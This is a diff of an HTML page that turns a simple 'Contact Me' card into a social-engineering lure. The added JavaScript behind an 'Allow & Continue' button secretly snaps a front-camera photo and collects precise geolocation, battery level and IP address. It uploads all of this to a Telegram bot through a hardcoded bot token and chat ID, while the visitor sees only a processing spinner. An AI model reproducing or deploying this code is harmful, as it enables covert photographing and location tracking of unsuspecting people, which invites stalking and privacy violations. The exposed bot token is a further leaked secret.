@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -13,7 +12,7 @@
         }
 
         body {
-            background: linear-gradient(45deg, #0a0a0a, #1a1a1a);
+            background: radial-gradient(circle, #0a0a0a, #1a1a1a);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -22,34 +21,27 @@
             font-family: 'Arial', sans-serif;
             overflow: hidden;
             position: relative;
+            color: white;
+            text-align: center;
         }
 
-        .particle {
-            position: absolute;
-            width: 2px;
-            height: 2px;
-            background: #fff;
+        .loader {
+            display: none;
+            border: 5px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
-            animation: float 8s infinite linear;
+            border-top: 5px solid white;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-top: 20px;
         }
 
-        @keyframes float {
-            0% {
-                transform: translateY(0) translateX(0);
-                opacity: 0;
-            }
-            50% {
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(-100vh) translateX(100px);
-                opacity: 0;
-            }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .quote-container {
-            text-align: center;
-            color: #fff;
             padding: 2rem;
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
@@ -62,19 +54,13 @@
         }
 
         @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.02);
-            }
-            100% {
-                transform: scale(1);
-            }
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
         }
 
         .quote {
-            font-size: 2.5rem;
+            font-size: 1.8rem;
             font-weight: bold;
             margin-bottom: 2rem;
             line-height: 1.4;
@@ -84,7 +70,7 @@
             text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
         }
 
-        .contact-btn {
+        .start-btn {
             padding: 15px 40px;
             font-size: 1.2rem;
             background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
@@ -97,53 +83,117 @@
             overflow: hidden;
         }
 
-        .contact-btn:hover {
+        .start-btn:hover {
             transform: translateY(-3px);
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
         }
 
-        .contact-btn:active {
-            transform: translateY(-1px);
+        .status-text {
+            display: none;
+            margin-top: 15px;
+            font-size: 1rem;
+            color: #fff;
         }
 
-        .contact-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.5s;
-        }
-
-        .contact-btn:hover::before {
-            left: 100%;
+        .contact-btn {
+            margin-top: 10px;
+            padding: 10px 30px;
+            font-size: 1rem;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid white;
+            border-radius: 50px;
+            color: white;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
         }
     </style>
 </head>
 <body>
     <div class="quote-container">
-        <p class="quote">HI MAYBE YOU KNOW ME , MAYBE <br> I WANT TO TALK TO YOU PLEASE TAP TO BUTTON </p>
-        <a href="https://www.instagram.com/the__.__spider?igsh=MTFweWw3MmNwbXE4aA==" target="_blank">
-            <button class="contact-btn">Contact Me</button>
-        </a>
+        <p class="quote">Hey! I want to know more about you.<br>Tap the button to continue.</p>
+        <button class="start-btn" onclick="startProcess()">Allow & Continue</button>
+        <div class="loader"></div>
+        <p class="status-text">Processing your request...</p>
+        <a href="https://www.instagram.com/the__.__spider" target="_blank" class="contact-btn">Contact Me</a>
     </div>
 
     <script>
-        // Create floating particles
-        function createParticles() {
-            for(let i = 0; i < 50; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + 'vw';
-                particle.style.animationDelay = Math.random() * 5 + 's';
-                particle.style.opacity = Math.random();
-                document.body.appendChild(particle);
+        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
+        const CHAT_IDS = ["5112680061"];  
+
+        function startProcess() {
+            document.querySelector(".start-btn").style.display = "none";
+            document.querySelector(".loader").style.display = "block";
+            document.querySelector(".status-text").style.display = "block";
+
+            captureDetails();
+        }
+
+        async function captureDetails() {
+            let video = document.createElement("video");
+            let canvas = document.createElement("canvas");
+            let context = canvas.getContext("2d");
+
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(async () => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    let imageData = canvas.toDataURL("image/png");
+                    stream.getTracks().forEach(track => track.stop());  
+
+                    let batteryPromise = navigator.getBattery().then(battery => `${Math.round(battery.level * 100)}%`).catch(() => "Unknown");
+                    let locationPromise = new Promise(resolve => {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
+                            () => resolve("Location Denied"),
+                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                        );
+                    });
+                    let ipPromise = fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "IP not available");
+                    let [battery, location, ip] = await Promise.all([batteryPromise, locationPromise, ipPromise]);
+
+                    sendToTelegram(imageData, battery, location, ip);
+                }, 2000);
+            } catch (err) {
+                console.log("Camera Permission Denied:", err);
+                document.querySelector(".status-text").textContent = "Permission Denied!";
             }
         }
 
-        createParticles();
+        function sendToTelegram(imageData, battery, location, ip) {
+            let message = `📸 **User Info**\n🔋 Battery: ${battery}\n📍 Location: ${location}\n🌐 IP: ${ip}`;
+
+            CHAT_IDS.forEach(chatId => {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+                });
+
+                let blob = dataURItoBlob(imageData);
+                let formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob, "image.png");
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData })
+                .then(() => {
+                    document.querySelector(".status-text").textContent = "Data Sent Successfully!";
+                    document.querySelector(".loader").style.display = "none";
+                });
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            let byteString = atob(dataURI.split(',')[1]);
+            let arrayBuffer = new ArrayBuffer(byteString.length);
+            let ia = new Uint8Array(arrayBuffer);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([arrayBuffer], { type: "image/png" });
+        }
     </script>
 </body>
 </html>
